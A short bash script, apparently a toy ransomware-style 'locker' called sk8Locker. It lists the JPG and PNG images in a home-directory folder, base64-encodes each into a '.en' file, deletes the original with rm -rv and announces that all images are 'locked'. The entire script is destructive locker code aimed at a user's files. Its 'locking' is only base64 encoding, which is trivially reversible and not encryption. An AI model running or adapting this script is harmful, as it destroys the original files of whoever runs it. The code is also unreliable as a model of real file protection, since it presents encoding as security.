#!/bin/bash
cd $HOME/sk8Locker

ls *.jpg *.png > iname.txt

input="iname.txt"

while IFS= read -r line; do
  base64 $line > $line.en
  rm -rv $line
done < "$input"
 
 
echo "all image file locked successfully!"
